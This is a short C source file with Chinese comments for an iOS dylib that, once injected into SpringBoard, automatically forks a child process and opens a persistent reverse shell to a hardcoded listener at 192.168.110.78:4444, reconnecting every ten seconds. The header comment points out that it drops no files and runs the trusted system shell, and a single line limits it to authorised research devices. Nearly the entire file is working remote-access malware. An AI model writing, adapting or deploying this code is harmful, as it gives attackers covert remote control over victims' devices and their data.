/*
 * reverse_shell.c - dylib 内 fork + 反向 shell，不释放任何文件
 *
 * 注入 SpringBoard 后：
 *   构造函数开线程 -> fork 子进程 -> 子进程 socket/connect/dup2 -> exec 系统 shell
 *   父进程保持 SpringBoard 正常；子进程断开后自动重连。
 *
 * 优点：不释放文件、不依赖载荷签名、最终执行系统自带 shell（合法信任）。
 * 仅限本人所有、已授权设备的安全研究。
 */

#include <unistd.h>
#include <pthread.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define LHOST "192.168.110.78"
#define LPORT 4444
#define RECONNECT_SEC 10

static const char *kShells[] = {
    "/var/jb/bin/sh",
    "/bin/sh",
    "/var/jb/usr/bin/bash",
    "/bin/bash",
    NULL,
};

/* fork 子进程内执行：连接攻击者并把自己替换成 shell；任何失败立即 _exit */
static void child_connect(void)
{
    int s = socket(AF_INET, SOCK_STREAM, 0);
    if (s < 0)
        _exit(1);

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(LPORT);
    addr.sin_addr.s_addr = inet_addr(LHOST);

    if (connect(s, (struct sockaddr *)&addr, sizeof(addr)) < 0)
        _exit(1);

    dup2(s, 0);
    dup2(s, 1);
    dup2(s, 2);
    for (int i = 3; i < 32; i++)
        close(i);

    for (int i = 0; kShells[i] != NULL; i++)
        execl(kShells[i], "sh", (char *)NULL);

    _exit(1);
}

static void *worker(void *arg)
{
    (void)arg;
    sleep(2);

    for (;;) {
        pid_t pid = fork();
        if (pid == 0) {
            child_connect();
            _exit(1);
        }
        if (pid > 0) {
            int status;
            waitpid(pid, &status, 0);
        }
        sleep(RECONNECT_SEC);
    }
    return NULL;
}

__attribute__((constructor))
static void initializer(void)
{
    pthread_t t;
    if (pthread_create(&t, NULL, worker, NULL) == 0)
        pthread_detach(t);
}
